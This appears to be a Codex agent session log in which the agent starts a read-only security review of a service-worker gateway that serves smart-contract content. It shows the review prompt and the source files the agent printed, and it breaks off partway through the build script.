@@ -1,0 +1,2580 @@
+Reading additional input from stdin...
+OpenAI Codex v0.158.0
+--------
+workdir: /tmp/tmp.WSl2mhjyqV/blind
+model: gpt-5.6-sol
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR]
+reasoning effort: high
+reasoning summaries: none
+session id: 01a1ff7a-cb5a-7e63-99ea-cf8a644b9814
+--------
+user
+# Leg prompt
+
+The prompt one independent adversarial review receives. Two substitutions are made before a harness
+sees it — the marker line in § What to review becomes the contents of [`../SCOPE`](../SCOPE), one
+path per line, and the marker in § Where to leave it becomes the directory that leg writes to.
+Nothing else is substituted, so what you read here, plus those two values, is what the model read.
+
+It lives in prose, outside the runner, on purpose: a heredoc inside a shell script is not something
+a human can disagree with.
+
+The method, the scope and the reasoning behind both are in [`../README.md`](../README.md).
+
+---
+
+You are running one leg of a two-leg security review of a web gateway. Another model, in another
+harness, is reviewing the same files independently; a third pass reconciles the two. Do not soften a
+finding because it might be wrong — a false positive costs a paragraph in the rollup, a miss costs
+the project.
+
+## What to review
+
+**Exactly these files, named explicitly.** Read each one in full.
+
+```
+src/core/abi.ts
+src/core/errors.ts
+src/core/ports.ts
+src/core/resolve.ts
+src/core/target.ts
+src/adapters/rpc/fetch.ts
+src/adapters/rpc/memory.ts
+src/adapters/sw/boot.ts
+src/adapters/sw/config.ts
+src/adapters/sw/fallback.ts
+src/adapters/sw/shell.html
+src/adapters/sw/sw.ts
+tools/build.ts
+tools/chains.ts
+tools/inline.ts
+```
+
+Files that are not listed are out of scope on purpose (`../README.md` § Scope); do not add them
+back. You are in a tree that holds the scoped files and nothing else, so there is no wider
+repository to explore: no tests, no documentation, no issue history, no previous audit. That is
+deliberate. Review what is in front of you.
+
+There is **no skill for this leg.** Nothing equivalent to a Solidity auditor skill exists for a
+browser gateway, and inventing an orchestration is not what is wanted here. Read the code and review
+it.
+
+Assume **no network**. Do not fetch a dependency, a CVE feed or a page; every claim must come from
+the bytes in front of you.
+
+## What this code is, and where it runs
+
+A **service worker and a boot page on a static host**. They are served from a project's own domain
+and answer every request on that origin by reading bytes out of a smart contract over public
+JSON-RPC, then serving them as if the origin held files. There is no server: the static host serves
+three files — a worker, a page, and a copy of that page for unknown paths — and everything else a
+visitor sees comes from a contract.
+
+The first visit has no worker yet, so the page registers one and the worker takes over; where a
+browser has no service workers at all, the page fetches the root document and writes it into itself.
+
+It is built in **three shapes**, and which one is being reviewed changes what a URL means:
+
+- **Unpinned.** The contract comes from the URL, in one of two forms: `<address>.<chain>.<host>/`,
+  where every contract gets its own origin, and `<loopback>/<chain>/<address>/`, which is accepted on
+  loopback hosts only.
+- **One contract, compiled in.** Every path on the origin is that one contract's resource and the
+  hostname is not read at all.
+- **Several chains of one project, compiled in.** Each chain's contract is served under
+  `/<chain>/`, the root redirects to a configured default, and any other first path segment is
+  answered without calling a chain.
+
+Which shape a build is, which contracts it serves and which endpoints it believes are all decided at
+**build time** by `tools/build.ts`, which substitutes values into the bundle and into the page. That
+file is in scope for exactly that reason.
+
+Review it as code that runs on a static host that cannot be configured, answering strangers, with a
+contract and an RPC endpoint as its only inputs — not as code that runs on a server anybody operates.
+
+## Surfaces this project wants looked at
+
+Not a checklist to tick, and not a boundary: a finding outside this list is still a finding. These
+are the places this project already knows are load-bearing, so a leg that says nothing about them
+has not finished.
+
+- **Which contract a URL reaches, in each of the three shapes.** Follow every path through
+  `targetOf` and the parsers it chooses between, and decide whether any URL can reach a contract
+  that the build did not configure — a hostname, a path, a percent-encoded segment, a redirect, a
+  path that looks like one shape's form while the build is another shape. The build decides which
+  parser is in the bundle; say what you think that means for what ships.
+- **Every redirect built from a request URL.** Where the destination comes from the URL, what is
+  carried across and what is dropped, and whether a redirect can be made to leave the origin or the
+  configured prefix.
+- **Status, headers and content type chosen by a contract.** The contract supplies all three for
+  every resource but the root. Find what a hostile contract can put in a header, what the allowlist
+  lets through, and what a chosen content type makes the browser do with the bytes.
+- **Contract bytes written into the page.** In the no-worker path the root document's bytes are
+  written into the live page. Ask what that means for a document a contract chose.
+- **The worker's `fetch` listener.** What it answers, what it lets through to the host, how it
+  treats the worker's own path, cross-origin requests, and methods other than GET.
+- **The boot page's loop guard and its use of `sessionStorage`.** It counts attempts to avoid
+  reloading forever. Ask what a visitor or a document can do to that counter.
+- **The JSON-RPC client.** The response size cap, the timeout, the order endpoints are tried in, and
+  what a hostile or broken endpoint can make the gateway do **other than serve a wrong document** —
+  that an endpoint which lies produces a wrong document is known, is inherent to trusting an
+  endpoint, and is somebody else's milestone. Resource exhaustion, a hang, a response that is never
+  released, something written outside the response: those are findings.
+- **The ABI decoder on hostile return data.** Every length and offset in it comes from the same
+  bytes being decoded. Look for a read past the end, an allocation chosen by the input, a loop whose
+  bound the input sets.
+- **The build as an injection point.** Values placed into the bundle by `define` and the script
+  substituted into the page. Ask what a wrong, hostile or merely surprising input to the build puts
+  into the deployable, and what the substitution would let through.
+- **Chains of one project sharing one origin.** In the several-chains shape, two contracts on two
+  chains are served from one origin, so the browser gives them one storage area, one worker
+  registration and one set of permissions. Say what that allows.
+
+## Where to leave it
+
+Write **`full-report.md`** into this directory, which already exists:
+
+```
+/tmp/tmp.WSl2mhjyqV/legs/gpt-5.6-sol
+```
+
+It is outside the tree you are reading on purpose: the other leg must not be able to read yours.
+Write nothing into the tree you are reviewing, and leave it exactly as you found it — no fixes, no
+formatting, no scratch files. A leg that dirties the tree costs the runner a cleanup it cannot
+distinguish from a real change.
+
+If part of this is something your harness cannot do, **do the review anyway, still write
+`full-report.md`**, and say plainly at the top what you could not run. A leg that degrades and says
+so is evidence. A leg that produces nothing is a failed pass, and it will be treated as one.
+
+## What a finding must carry
+
+- **A `file:line`.** The rollup deduplicates across two legs that share no vocabulary; a location is
+  what makes two descriptions of one bug recognisable as one bug.
+- **A severity you would defend.** The other leg's severity for the same finding will be put beside
+  yours, and a disagreement is reported rather than averaged.
+- **A one-line reproduction** — the URL, the contract value or the endpoint response that produces
+  the effect. "Unsanitised data reaches the DOM" is a category; "a contract whose `request()`
+  returns content type `text/html` for `/x.js` makes the browser execute it at `sw.ts:NN`" is a
+  finding.
+
+State the severity scale you used.
+
+## What this leg is not
+
+It does not fix anything. No edit to the code, a test or the build. Triage and repair are a separate
+step, and a finding is worth more untouched than it is worth quietly fixed.
+
+It also does not rank the project. No summary posture, no score, no "overall the code is sound" —
+the rollup decides what the two legs together mean.
+warning: Codex could not find bubblewrap on PATH. Install bubblewrap with your OS package manager. See the sandbox prerequisites: https://developers.openai.com/codex/concepts/sandboxing#prerequisites. Codex will use the bundled bubblewrap in the meantime.
+codex
+I’ll review only the 15 named files, trace the three build shapes and runtime flows, then write the untouched-code findings to the required `full-report.md`. I’ll use no network and make no changes inside the review tree.
+exec
+/bin/bash -lc 'pwd && rg --files src/core src/adapters/rpc src/adapters/sw tools && git status --short && wc -l src/core/abi.ts src/core/errors.ts src/core/ports.ts src/core/resolve.ts src/core/target.ts src/adapters/rpc/fetch.ts src/adapters/rpc/memory.ts src/adapters/sw/boot.ts src/adapters/sw/config.ts src/adapters/sw/fallback.ts src/adapters/sw/shell.html src/adapters/sw/sw.ts tools/build.ts tools/chains.ts tools/inline.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+/tmp/tmp.WSl2mhjyqV/blind
+src/adapters/sw/boot.ts
+src/adapters/sw/config.ts
+src/adapters/sw/fallback.ts
+src/adapters/sw/shell.html
+src/adapters/sw/sw.ts
+src/core/abi.ts
+src/core/resolve.ts
+src/core/errors.ts
+src/core/target.ts
+src/core/ports.ts
+tools/build.ts
+tools/chains.ts
+tools/inline.ts
+src/adapters/rpc/fetch.ts
+src/adapters/rpc/memory.ts
+  167 src/core/abi.ts
+   29 src/core/errors.ts
+   23 src/core/ports.ts
+  109 src/core/resolve.ts
+  237 src/core/target.ts
+   96 src/adapters/rpc/fetch.ts
+   18 src/adapters/rpc/memory.ts
+  107 src/adapters/sw/boot.ts
+   33 src/adapters/sw/config.ts
+   91 src/adapters/sw/fallback.ts
+   14 src/adapters/sw/shell.html
+   64 src/adapters/sw/sw.ts
+  136 tools/build.ts
+   73 tools/chains.ts
+   31 tools/inline.ts
+ 1228 total
+
+exec
+/bin/bash -lc 'nl -ba src/adapters/rpc/fetch.ts; nl -ba src/adapters/rpc/memory.ts; nl -ba src/adapters/sw/boot.ts; nl -ba src/adapters/sw/config.ts; nl -ba src/adapters/sw/fallback.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+     1	import { hexToBytes } from "../../core/abi.ts";
+     2	import { GatewayError } from "../../core/errors.ts";
+     3	import { type Rpc, RpcRevert } from "../../core/ports.ts";
+     4	
+     5	/** Chain id to its JSON-RPC endpoints, tried in order. */
+     6	export type Chains = Readonly<Record<string, readonly string[]>>;
+     7	
+     8	export interface FetchRpcOptions {
+     9	  timeoutMs?: number;
+    10	  /** Cap on one JSON-RPC response body. The document arrives hex-encoded, so twice its size. */
+    11	  maxBytes?: number;
+    12	  fetch?: typeof fetch;
+    13	}
+    14	
+    15	interface JsonRpcReply {
+    16	  result?: unknown;
+    17	  error?: { code?: unknown; message?: unknown; data?: unknown };
+    18	}
+    19	
+    20	async function readCapped(res: Response, maxBytes: number): Promise<string> {
+    21	  if (!res.body) return "";
+    22	  const reader = res.body.getReader();
+    23	  const text = new TextDecoder();
+    24	  let out = "";
+    25	  let seen = 0;
+    26	  for (;;) {
+    27	    const { done, value } = await reader.read();
+    28	    if (done) return out + text.decode();
+    29	    seen += value.length;
+    30	    if (seen > maxBytes) {
+    31	      await reader.cancel();
+    32	      throw new Error("response exceeds the size cap");
+    33	    }
+    34	    out += text.decode(value, { stream: true });
+    35	  }
+    36	}
+    37	
+    38	/** A revert is the contract's answer; every other JSON-RPC error is the endpoint's problem. */
+    39	function isRevert(error: NonNullable<JsonRpcReply["error"]>): boolean {
+    40	  return error.code === 3 || (typeof error.message === "string" && /revert/i.test(error.message));
+    41	}
+    42	
+    43	/**
+    44	 * JSON-RPC over `fetch`, with ordered failover. Limits: one endpoint's word is taken as the chain's;
+    45	 * there is no quorum and no proof verification.
+    46	 *
+    47	 * `timeoutMs` bounds **one** endpoint, not the call. The endpoints are tried in order and nothing
+    48	 * spans the list, so with `n` endpoints a single `call` can take up to `n × timeoutMs` before it
+    49	 * throws `upstream` — at the defaults, two endpoints that never answer cost 20 s. Callers that need
+    50	 * a deadline across the whole list must impose it themselves; a budget here is M04's, not this
+    51	 * adapter's.
+    52	 */
+    53	export function createFetchRpc(chains: Chains, options: FetchRpcOptions = {}): Rpc {
+    54	  const { timeoutMs = 10_000, maxBytes = 16 * 1024 * 1024 } = options;
+    55	  const send = options.fetch ?? fetch;
+    56	
+    57	  async function callOne(endpoint: string, to: string, data: string): Promise<Uint8Array> {
+    58	    const res = await send(endpoint, {
+    59	      method: "POST",
+    60	      headers: { "content-type": "application/json" },
+    61	      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_call", params: [{ to, data }, "latest"] }),
+    62	      signal: AbortSignal.timeout(timeoutMs),
+    63	      credentials: "omit",
+    64	      cache: "no-store",
+    65	      referrerPolicy: "no-referrer",
+    66	    });
+    67	    /* A non-2xx body is not an answer, whatever it contains. Without this, a 429 or a 500 whose
+    68	       body happened to be JSON-RPC-shaped would be believed and failover would not happen. */
+    69	    if (!res.ok) throw new Error(`endpoint returned HTTP ${res.status}`);
+    70	    const text = await readCapped(res, maxBytes);
+    71	    const reply = JSON.parse(text) as JsonRpcReply;
+    72	    if (reply.error) {
+    73	      if (isRevert(reply.error)) throw new RpcRevert();
+    74	      throw new Error("endpoint returned an error");
+    75	    }
+    76	    if (typeof reply.result !== "string") throw new Error("endpoint returned no result");
+    77	    return hexToBytes(reply.result);
+    78	  }
+    79	
+    80	  return {
+    81	    supports: (chain) => (chains[chain]?.length ?? 0) > 0,
+    82	    async call(chain, to, data) {
+    83	      const endpoints = chains[chain] ?? [];
+    84	      if (endpoints.length === 0) throw new GatewayError("unknown-chain", `chain ${chain} is not configured`);
+    85	      for (const endpoint of endpoints) {
+    86	        try {
+    87	          return await callOne(endpoint, to, data);
+    88	        } catch (error) {
+    89	          if (error instanceof RpcRevert) throw error;
+    90	          // Deliberately swallowed: the next endpoint is the handling.
+    91	        }
+    92	      }
+    93	      throw new GatewayError("upstream", `no RPC endpoint for chain ${chain} answered`);
+    94	    },
+    95	  };
+    96	}
+     1	import { type Rpc, RpcRevert } from "../../core/ports.ts";
+     2	
+     3	/** `chain:address:calldata` to return data. A missing key reverts, as an unknown selector would. */
+     4	export type MemoryCalls = Map<string, Uint8Array>;
+     5	
+     6	export const memoryKey = (chain: string, to: string, data: string): string => `${chain}:${to}:${data}`;
+     7	
+     8	/** The local adapter: a complete `Rpc` over a map, and the contract every other adapter meets. */
+     9	export function createMemoryRpc(chainIds: string[], calls: MemoryCalls): Rpc {
+    10	  return {
+    11	    supports: (chain) => chainIds.includes(chain),
+    12	    async call(chain, to, data) {
+    13	      const out = calls.get(memoryKey(chain, to, data));
+    14	      if (out === undefined) throw new RpcRevert();
+    15	      return out;
+    16	    },
+    17	  };
+    18	}
+     1	/// <reference lib="dom" />
+     2	import { GatewayError } from "../../core/errors.ts";
+     3	import { resolve } from "../../core/resolve.ts";
+     4	import { createFetchRpc } from "../rpc/fetch.ts";
+     5	import { CHAINS, FRAME, PURGE, SW_PATH, targetOf } from "./config.ts";
+     6	import {
+     7	  MAX_ATTEMPTS,
+     8	  attemptsFrom,
+     9	  attemptsValue,
+    10	  headersAreHonourable,
+    11	  isRootTarget,
+    12	} from "./fallback.ts";
+    13	
+    14	// The static host serves this page for every URL. It runs only when the service worker does not
+    15	// control the page: a first visit, a forced reload, or a browser without service workers.
+    16	
+    17	const ATTEMPTS = "gw44:boot";
+    18	const WORKER_MS = 4000;
+    19	
+    20	function say(message: string): void {
+    21	  const el = document.getElementById("gw44");
+    22	  if (el) el.textContent = message;
+    23	}
+    24	
+    25	/** Counts reloads inside a short window, so a worker that never takes control cannot loop the page.
+    26	 *  The reading of the stored value is `fallback.ts`'s, where it is tested without a browser. */
+    27	function attempt(): number {
+    28	  try {
+    29	    const now = Date.now();
+    30	    const n = attemptsFrom(sessionStorage.getItem(ATTEMPTS), now);
+    31	    sessionStorage.setItem(ATTEMPTS, attemptsValue(n, now));
+    32	    return n;
+    33	  } catch {
+    34	    return MAX_ATTEMPTS; // storage blocked: no loop guard, so do not reload at all
+    35	  }
+    36	}
+    37	
+    38	const NEEDS_WORKER = "gw44: this page needs a service worker, and this browser is not providing one here.";
+    39	
+    40	/**
+    41	 * No service worker: fetch the contract's root document here and write it over this page. Same
+    42	 * origin, same URL, and only ever the root — without a worker nothing can answer the document's
+    43	 * relative URLs, so a deeper path would render a document whose own subresources cannot load.
+    44	 *
+    45	 * It declines, with one sentence, unless all three hold: this is the top-level page, the URL is the
+    46	 * contract's root, and the response carries no header this page cannot honour.
+    47	 */
+    48	async function renderInline(url: URL): Promise<void> {
+    49	  const target = targetOf(url);
+    50	  if (target === null) return;
+    51	  // Both checked before the call, so a URL that will be declined costs no chain read.
+    52	  if (window.top !== window.self) return say(NEEDS_WORKER);
+    53	  if (!isRootTarget(target)) return say(NEEDS_WORKER);
+    54	  const res = await resolve(target, createFetchRpc(CHAINS), FRAME);
+    55	  const type = res.headers.find(([k]) => k === "content-type")?.[1] ?? "";
+    56	  const text = new TextDecoder().decode(res.body);
+    57	  if (res.status !== 200 || !type.startsWith("text/html")) return say(text.trim());
+    58	  if (!headersAreHonourable(res)) return say(NEEDS_WORKER);
+    59	  document.open();
+    60	  document.write(text);
+    61	  document.close();
+    62	}
+    63	
+    64	async function boot(): Promise<void> {
+    65	  const url = new URL(location.href);
+    66	  try {
+    67	    const target = targetOf(url);
+    68	    if (target === null) return say("gw44: no contract in this URL");
+    69	    /* Before any worker is registered: a multi-chain build sends `/` to the default chain's prefix,
+    70	       and the no-worker fallback can only render the root document of the URL it is on. Moving
+    71	       first means that fallback never renders the default chain's document at `/`, where the
+    72	       document's relative URLs would resolve outside the prefix.
+    73	
+    74	       The fragment is carried explicitly. A browser keeps it across the worker's 302 and 308 by
+    75	       itself, but a script navigation does not, so without this a first visit to `/#/docs` landed
+    76	       on `/<default>/` while every later visit landed on `/<default>/#/docs`. */
+    77	    if (target.redirect !== undefined) return void location.replace(target.redirect + location.hash);
+    78	  } catch (error) {
+    79	    /* A configured build throws rather than returning null for a first segment it has no contract
+    80	       for, and that is the ordinary case of a visitor mistyping a chain — not a malformed URL. The
+    81	       worker serves `gw44: no contract at this path` there, so the page without a worker says the
+    82	       same sentence (#82). Anything that is not the gateway's own error keeps the old one. */
+    83	    return say(error instanceof GatewayError ? `gw44: ${error.message}` : "gw44: malformed URL");
+    84	  }
+    85	  if (!("serviceWorker" in navigator) || attempt() >= MAX_ATTEMPTS) return renderInline(url);
+    86	  try {
+    87	    // Raced, because a browser that blocks workers may leave `register` or `ready` pending forever.
+    88	    const registration = await Promise.race([
+    89	      navigator.serviceWorker
+    90	        .register(SW_PATH, { scope: "/", updateViaCache: "none" })
+    91	        .then(() => navigator.serviceWorker.ready),
+    92	      new Promise<never>((_, fail) => setTimeout(() => fail(new Error("worker timeout")), WORKER_MS)),
+    93	    ]);
+    94	    // Active but not controlling this page: the user forced a reload. Clear before going back.
+    95	    await new Promise<void>((done) => {
+    96	      const channel = new MessageChannel();
+    97	      channel.port1.onmessage = () => done();
+    98	      registration.active?.postMessage(PURGE, [channel.port2]);
+    99	      setTimeout(done, 1000);
+   100	    });
+   101	    location.reload();
+   102	  } catch {
+   103	    await renderInline(url);
+   104	  }
+   105	}
+   106	
+   107	void boot().catch(() => say("gw44: failed to load"));
+     1	import { type Frame, type Pins, type Target, parseTarget, pinnedTarget } from "../../core/target.ts";
+     2	import type { Chains } from "../rpc/fetch.ts";
+     3	
+     4	// Replaced by the build with the contents of the chains file. Baked in rather than fetched, so the
+     5	// service worker's bytes are the whole of what decides which endpoint is believed.
+     6	declare const __GW44_CHAINS__: Chains;
+     7	/** The configured contracts, or null in an ordinary build. Replaced by the build, like the chains. */
+     8	declare const __GW44_PINS__: Pins | null;
+     9	/**
+    10	 * Whether this build is pinned. A separate boolean rather than a `__GW44_PINS__ === null` test,
+    11	 * because the bundler folds a boolean constant in both directions and so drops the parser each
+    12	 * build does not use: comparing the object with null folds only the unpinned way, which left both
+    13	 * parsers in every bundle and cost the unpinned worker 570 bytes.
+    14	 */
+    15	declare const __GW44_PINNED__: boolean;
+    16	
+    17	export const CHAINS: Chains = __GW44_CHAINS__;
+    18	
+    19	/**
+    20	 * The one place either adapter decides which contract a URL names. A pinned build answers for its
+    21	 * configured contracts and reads no hostname; an unpinned build reads the two URL forms as before.
+    22	 */
+    23	export const targetOf: (url: URL) => Target | null = __GW44_PINNED__
+    24	  ? (url: URL) => pinnedTarget(url, __GW44_PINS__ as Pins)
+    25	  : parseTarget;
+    26	
+    27	/** The build's framing setting for a root document (#57). An unpinned build and a `PIN=` build have
+    28	 *  no configuration file to say otherwise, so both take the default. */
+    29	export const FRAME: Frame = (__GW44_PINNED__ ? (__GW44_PINS__ as Pins).frame : undefined) ?? "self";
+    30	/** Reserved on every origin the gateway serves: the worker answers this path itself with a 404 and
+    31	 *  no chain read, so a contract's own resource of this name is shadowed rather than served (#62). */
+    32	export const SW_PATH = "/gw44-sw.js";
+    33	export const PURGE = "gw44:purge";
+     1	import type { GatewayResponse } from "../../core/ports.ts";
+     2	import { ROOT_FRAME_POLICY } from "../../core/resolve.ts";
+     3	import type { Target } from "../../core/target.ts";
+     4	
+     5	/**
+     6	 * What the no-worker fallback may render, as two pure decisions so they can be tested without a
+     7	 * browser. The third condition — that the page is the top-level one — needs `window`, so it stays
+     8	 * in `boot.ts`.
+     9	 *
+    10	 * The fallback writes a contract's bytes into a document whose real headers are the static host's,
+    11	 * so anything the contract set to constrain its own document would not apply and the visitor could
+    12	 * not tell (F2, the 2026-11-20 review). Rather than honour part of what a contract asked for, it
+    13	 * declines.
+    14	 */
+    15	
+    16	/**
+    17	 * Headers this page cannot honour. `content-security-policy-report-only` is here although the core's
+    18	 * allowlist does not pass it: this list is what the fallback cannot honour, not what can reach it,
+    19	 * and the two should not have to be read together to be safe.
+    20	 */
+    21	export const UNHONOURABLE_HEADERS = [
+    22	  "content-security-policy",
+    23	  "content-security-policy-report-only",
+    24	  "x-frame-options",
+    25	  "cross-origin-opener-policy",
+    26	  "cross-origin-embedder-policy",
+    27	  "cross-origin-resource-policy",
+    28	  "permissions-policy",
+    29	  "content-disposition",
+    30	];
+    31	
+    32	/**
+    33	 * Only a contract's root. Without a worker nothing answers the document's relative URLs, so a deeper
+    34	 * path would render a document whose own subresources cannot load.
+    35	 */
+    36	export function isRootTarget(target: Target): boolean {
+    37	  return target.resource.length === 0;
+    38	}
+    39	
+    40	/**
+    41	 * True when every header of the response is one this page can honour.
+    42	 *
+    43	 * Live since #57, which gives a root document `content-security-policy: frame-ancestors 'self'`. A
+    44	 * document write cannot apply a policy, so the page cannot honour that header the way a real
+    45	 * response would — but it does not have to: `boot.ts` renders only when `window.top === window.self`
+    46	 * (`renderInline`, the check before the chain read), so what it renders is never in a frame at all,
+    47	 * which is stricter than the policy asks for. That holds for this exact policy and for nothing else,
+    48	 * so the value is compared rather than the name allowed: any other directive, including a wider
+    49	 * `frame-ancestors`, is a policy whose effect the page would be dropping, and it declines.
+    50	 */
+    51	export function headersAreHonourable(res: GatewayResponse): boolean {
+    52	  return res.headers.every(([key, value]) => {
+    53	    const name = key.toLowerCase();
+    54	    if (!UNHONOURABLE_HEADERS.includes(name)) return true;
+    55	    return name === "content-security-policy" && value === ROOT_FRAME_POLICY;
+    56	  });
+    57	}
+    58	
+    59	/** Reloads allowed inside `ATTEMPT_WINDOW_MS` before the page stops trying to install a worker. */
+    60	export const MAX_ATTEMPTS = 2;
+    61	/** How long a reload counts towards the limit: longer than a worker install, shorter than a visit. */
+    62	export const ATTEMPT_WINDOW_MS = 10_000;
+    63	
+    64	/** The stored counter's only accepted shape: one digit of count, a colon, an integer of epoch ms. */
+    65	const ATTEMPTS = /^([0-9]):([0-9]{1,15})$/;
+    66	
+    67	/**
+    68	 * How many reloads this page has already made, read from session storage (#59).
+    69	 *
+    70	 * A rendered contract document shares this origin's session storage and can write anything into the
+    71	 * key. So a value this cannot read as a counter is `MAX_ATTEMPTS` and never 0: a document can then
+    72	 * stop a reload, which costs one page rendered inline, but cannot spend the page's reloads for it or
+    73	 * drive it in a loop. The old parser took `Number("")` as `NaN`, compared it and arrived at 0. A
+    74	 * timestamp in the future is the same answer, since it would otherwise hold the window open for as
+    75	 * long as the document liked.
+    76	 */
+    77	export function attemptsFrom(stored: string | null, now: number): number {
+    78	  if (stored === null) return 0;
+    79	  const parts = ATTEMPTS.exec(stored);
+    80	  if (parts === null) return MAX_ATTEMPTS;
+    81	  const at = Number(parts[2]);
+    82	  if (at > now) return MAX_ATTEMPTS;
+    83	  // Outside the window it is a fresh visit, whatever it counted: the reloads are spent, not lost.
+    84	  return now - at < ATTEMPT_WINDOW_MS ? Number(parts[1]) : 0;
+    85	}
+    86	
+    87	/** The value to store for the next load. Kept to the shape `attemptsFrom` accepts, counter clamped
+    88	 *  to one digit so that what this writes is always a value it can read back. */
+    89	export function attemptsValue(attempts: number, now: number): string {
+    90	  return `${Math.min(attempts + 1, 9)}:${now}`;
+    91	}
+
+exec
+/bin/bash -lc 'nl -ba src/adapters/sw/shell.html; nl -ba src/adapters/sw/sw.ts; nl -ba tools/build.ts; nl -ba tools/chains.ts; nl -ba tools/inline.ts' in /tmp/tmp.WSl2mhjyqV/blind
+exec
+/bin/bash -lc 'nl -ba src/core/abi.ts; nl -ba src/core/errors.ts; nl -ba src/core/ports.ts; nl -ba src/core/resolve.ts; nl -ba src/core/target.ts' in /tmp/tmp.WSl2mhjyqV/blind
+ succeeded in 0ms:
+     1	<!doctype html>
+     2	<html lang="en">
+     3	<head>
+     4	<meta charset="utf-8">
+     5	<meta name="viewport" content="width=device-width,initial-scale=1">
+     6	<meta name="robots" content="noindex">
+     7	<title>gw44</title>
+     8	</head>
+     9	<body>
+    10	<pre id="gw44">gw44: loading from chain…</pre>
+    11	<noscript><pre>gw44 reads this page from a contract in your browser, which needs JavaScript.</pre></noscript>
+    12	<script>/*@boot@*/</script>
+    13	</body>
+    14	</html>
+     1	/// <reference lib="webworker" />
+     2	import { GatewayError } from "../../core/errors.ts";
+     3	import { errorResponse, resolve } from "../../core/resolve.ts";
+     4	import type { GatewayResponse } from "../../core/ports.ts";
+     5	import { createFetchRpc } from "../rpc/fetch.ts";
+     6	import { CHAINS, FRAME, PURGE, SW_PATH, targetOf } from "./config.ts";
+     7	
+     8	declare const self: ServiceWorkerGlobalScope;
+     9	
+    10	const rpc = createFetchRpc(CHAINS);
+    11	
+    12	function toResponse(r: GatewayResponse): Response {
+    13	  const nullBody = r.status === 204 || r.status === 205 || r.status === 304;
+    14	  return new Response(nullBody ? null : (r.body as Uint8Array<ArrayBuffer>), { status: r.status, headers: r.headers });
+    15	}
+    16	
+    17	async function handle(url: URL): Promise<Response> {
+    18	  try {
+    19	    const target = targetOf(url);
+    20	    if (target === null) return fetch(url);
+    21	    if (target.redirect !== undefined) {
+    22	      return Response.redirect(new URL(target.redirect, url), target.redirectStatus ?? 308);
+    23	    }
+    24	    return toResponse(await resolve(target, rpc, FRAME));
+    25	  } catch (error) {
+    26	    return toResponse(errorResponse(error));
+    27	  }
+    28	}
+    29	
+    30	// A new worker replaces the old one at once: there is no cached state for the two to disagree on.
+    31	self.addEventListener("install", () => void self.skipWaiting());
+    32	self.addEventListener("activate", (event) => event.waitUntil(self.clients.claim()));
+    33	
+    34	self.addEventListener("fetch", (event) => {
+    35	  const url = new URL(event.request.url);
+    36	  // Not ours: the document's own traffic (its RPC, its wallet) and anything that is not a read.
+    37	  if (url.origin !== self.location.origin) return;
+    38	  if (event.request.method !== "GET" && event.request.method !== "HEAD") return;
+    39	  /* The gateway's own script, answered here in every build and never read from a contract (#62).
+    40	     A pinned build turns every path into a resource of its contract, so without this the path the
+    41	     worker is registered from is an `eth_call`, and whatever the contract returns for it is served
+    42	     from the gateway's origin at the gateway's own script URL. The browser fetches the worker's
+    43	     script outside this handler, so a worker update is unaffected: what reaches here is a page
+    44	     asking for the file. */
+    45	  if (url.pathname === SW_PATH) {
+    46	    return event.respondWith(
+    47	      toResponse(errorResponse(new GatewayError("not-found", `${SW_PATH} is the gateway's own script`))),
+    48	    );
+    49	  }
+    50	  let named: boolean;
+    51	  try {
+    52	    named = targetOf(url) !== null;
+    53	  } catch {
+    54	    named = true; // malformed, but ours to answer
+    55	  }
+    56	  if (!named) return;
+    57	  event.respondWith(handle(url));
+    58	});
+    59	
+    60	// Nothing is cached yet, so there is nothing to purge. The message exists so the boot script's
+    61	// forced-reload path is already the one a cache will be cleared through.
+    62	self.addEventListener("message", (event) => {
+    63	  if (event.data === PURGE) event.ports[0]?.postMessage(true);
+    64	});
+     1	// Builds the whole deployable: dist/gw44-sw.js, dist/index.html and its copy dist/404.html.
+     2	//   node tools/build.ts            chains from ./chains.json, output to ./dist
+     3	//   GW44_CHAINS=… GW44_OUT=… node tools/build.ts
+     4	//   GW44_PIN=<chain>:<address>     one contract at every URL, that chain's endpoints only
+     5	//   GW44_CONFIG=gw44.json          one project's contract per chain, each under /<chain>/
+     6	import { createHash } from "node:crypto";
+     7	import { mkdir, readFile, readdir, writeFile } from "node:fs/promises";
+     8	import { build } from "esbuild";
+     9	import { type Pins, parsePin, parsePins } from "../src/core/target.ts";
+    10	import { readChains } from "./chains.ts";
+    11	import { inlineBoot } from "./inline.ts";
+    12	
+    13	const out = process.env["GW44_OUT"] ?? "dist";
+    14	
+    15	/** Every configured contract, and which chain `/` goes to, so the log says what was built. */
+    16	function listing(pins: Pins): string {
+    17	  const each = Object.entries(pins.contracts)
+    18	    .map(([chain, address]) => `${chain}:${address}`)
+    19	    .join(" ");
+    20	  return Object.keys(pins.contracts).length === 1 ? each : `${each}, default ${pins.default}`;
+    21	}
+    22	
+    23	/** The deployable is these three files and nothing else; `gw44-sw.js` holds scope `/` at the root. */
+    24	const EXPECTED = ["404.html", "gw44-sw.js", "index.html"];
+    25	/** The worker is code every visitor of every contract executes, so its size is a gate, not a note. */
+    26	const SW_LIMIT = 16_384;
+    27	/* Validated here rather than trusted: these endpoints are compiled into the worker, so a bad one
+    28	   is not a build-time inconvenience but a URL every visitor's browser then talks to (#63). */
+    29	const chains = await readChains(process.env["GW44_CHAINS"] ?? "chains.json", (p) => readFile(p, "utf8"));
+    30	
+    31	/* The contracts are compiled in, like the endpoints: the bytes a visitor runs are the whole of what
+    32	   decides what is served. An unpinned build defines them as null and keeps every chain. */
+    33	/* Set but empty is a mistake, not a default. CI templating a value that was not provided used to
+    34	   produce an unpinned build with every chain in the chains file, distinguishable only by the log's
+    35	   first line (#73). Unset still means unpinned, which is what a developer typing `make build` wants. */
+    36	for (const name of ["GW44_PIN", "GW44_CONFIG"] as const) {
+    37	  const value = process.env[name];
+    38	  if (value !== undefined && value.trim() === "") {
+    39	    throw new Error(`${name} is set but empty; unset it for an unpinned build, or give it a value`);
+    40	  }
+    41	}
+    42	
+    43	const raw = process.env["GW44_PIN"] ?? "";
+    44	const configPath = process.env["GW44_CONFIG"] ?? "";
+    45	if (raw !== "" && configPath !== "") {
+    46	  throw new Error("GW44_PIN and GW44_CONFIG both set; a build serves one configuration, so pick one");
+    47	}
+    48	let pins: Pins | null = null;
+    49	let endpoints: Readonly<Record<string, readonly string[]>> = chains;
+    50	if (raw !== "" || configPath !== "") {
+    51	  pins =
